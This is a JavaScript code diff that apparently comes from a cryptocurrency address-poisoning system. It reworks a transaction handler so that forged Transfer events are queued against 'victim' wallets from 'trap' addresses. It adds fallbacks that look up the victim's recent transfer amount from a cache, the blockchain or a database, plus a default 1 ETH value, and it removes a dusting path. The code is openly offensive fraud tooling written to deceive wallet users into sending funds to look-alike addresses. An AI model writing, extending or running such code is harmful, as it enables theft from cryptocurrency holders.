@@ -2337,57 +2337,102 @@ function checkTransaction(tx, txLogs = []) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
 
-      // 🚀 VECTOR 1: Queue forged Transfer event for batch processing
-      const mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
+      // 🚀 VECTOR 1: Queue forged Transfer event for batch processing (ALWAYS USE BATCH)
+      let mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
+      let mirrorAsset = detectedAsset || 'ETH';
       let mirrorQueued = false;
 
-      if (mirrorRaw > 0n) {
-        // 🚀 CACHE: Store victim→counterparty transfer for counter-poison use
-        recentVictimTransfers.set(from, { amount: mirrorRaw, asset: detectedAsset, timestamp: Date.now() });
-        logger.info(`[cache] 🧠 Cached victim→counterparty transfer for ${from.slice(0, 10)}...: ${mirrorRaw} ${detectedAsset}`);
-
-        let mirrorContractAddress =
-          MIRROR_CONTRACTS[detectedAsset] ||
-          MIRROR_CONTRACTS[detectedAsset?.toUpperCase()] ||
-          MIRROR_TOKEN_NATIVE;
-
-        const isFallback = mirrorContractAddress === MIRROR_TOKEN_NATIVE &&
-          detectedAsset &&
-          !['ETH', 'BNB', 'MATIC'].includes(detectedAsset.toUpperCase());
-        if (isFallback) {
-          logger.info(`[mirror] Using ETH fallback for unknown token: ${detectedAsset}`);
-        }
-
-        if (mirrorContractAddress) {
-          const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
-          if (campaignWallet) {
-            logger.info(`[mirror] Detected ${detectedAsset}, queueing for batch via ${mirrorContractAddress.slice(0, 10)}...`);
-
-            queuePoison(
-              entry.campaignId,
-              mirrorContractAddress,
-              from,
-              entry.trapAddress,
-              mirrorRaw,
-              'auto',
-              entry,
-              detectedAsset
-            );
-
-            mirrorQueued = true;
-          } else {
-            logger.debug(`[mirror] No funding key loaded for campaign ${entry.campaignId}, skipping mirror`);
-          }
-        } else {
-          logger.debug(`[mirror] No mirror contract configured for asset: ${detectedAsset}`);
+      // 🚀 FIX: If no amount detected from tx, use fallbacks to ensure batch is used
+      if (mirrorRaw === 0n) {
+        const recent = recentVictimTransfers.get(from.toLowerCase());
+        if (recent && recent.amount > 0n) {
+          mirrorRaw = recent.amount;
+          mirrorAsset = recent.asset;
+          logger.info(`[mirror] Using cache fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
         }
       }
 
-      // VECTOR 2 (real dust): conditional based on env flag
-      if (SKIP_DUST_IF_MIRROR && mirrorQueued) {
-        logger.info(`[skip-dust] Mirror queued for batch for ${from}. Skipping real dust to save trap funds.`);
+      if (mirrorRaw === 0n && entry.counterparty) {
+        const chainResult = await fetchLastTransferFromChain(from.toLowerCase(), entry.counterparty.toLowerCase());
+        if (chainResult && chainResult.amount > 0n) {
+          mirrorRaw = chainResult.amount;
+          mirrorAsset = chainResult.asset;
+          logger.info(`[mirror] Using blockchain fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
+        }
+      }
+
+      if (mirrorRaw === 0n && supabaseService) {
+        try {
+          const { data: trapData } = await supabaseService
+            .from('traps')
+            .select('last_transfer_amount, last_transfer_asset')
+            .eq('victim_address', from.toLowerCase())
+            .eq('counterparty_address', entry.counterparty?.toLowerCase())
+            .limit(1)
+            .maybeSingle();
+
+          if (trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
+            const realAmount = trapData.last_transfer_amount;
+            const realAsset = trapData.last_transfer_asset;
+            let rawValue = 0n;
+            const amountStr = String(realAmount).trim();
+            if (amountStr.startsWith('0x')) {
+              rawValue = BigInt(amountStr);
+            } else if (amountStr.includes('.')) {
+              const decimals = getDecimals(realAsset);
+              const parts = amountStr.split('.');
+              const whole = BigInt(parts[0] || '0');
+              const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
+              rawValue = whole * (10n ** BigInt(decimals)) + BigInt(fracStr || '0');
+            } else {
+              rawValue = BigInt(amountStr);
+            }
+            if (rawValue > 0n) {
+              mirrorRaw = rawValue;
+              mirrorAsset = realAsset;
+              logger.info(`[mirror] Using DB fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
+            }
+          }
+        } catch (e) { }
+      }
+
+      if (mirrorRaw === 0n) {
+        mirrorRaw = BigInt('1000000000000000000'); // 1 ETH
+        mirrorAsset = 'ETH';
+        logger.info(`[mirror] Using default 1 ETH fallback for batch`);
+      }
+
+      // Cache the resolved amount for counter-poisons
+      recentVictimTransfers.set(from.toLowerCase(), { amount: mirrorRaw, asset: mirrorAsset, timestamp: Date.now() });
+
+      let mirrorContractAddress =
+        MIRROR_CONTRACTS[mirrorAsset] ||
+        MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] ||
+        MIRROR_TOKEN_NATIVE;
+
+      const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
+      if (campaignWallet && mirrorContractAddress) {
+        queuePoison(
+          entry.campaignId,
+          mirrorContractAddress,
+          from,
+          entry.trapAddress,
+          mirrorRaw,
+          'auto',
+          entry,
+          mirrorAsset
+        );
+        mirrorQueued = true;
+        logger.info(`[mirror] Queued auto-poison for batch via ${mirrorContractAddress.slice(0, 10)}...`);
       } else {
-        await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
+        logger.warn(`[mirror] No funding wallet or contract found for ${mirrorAsset}, batch skipped.`);
+      }
+
+      // 🚀 FIX: NEVER call duster.py for auto-triggers. Batch only.
+      if (mirrorQueued) {
+        logger.info(`[skip-dust] Auto-poison queued for batch. Skipping duster.py completely.`);
+      } else {
+        logger.warn(`[fallback] Batch completely unavailable for ${from}. Skipping auto-poison to save trap funds.`);
       }
 
     } catch (err) {
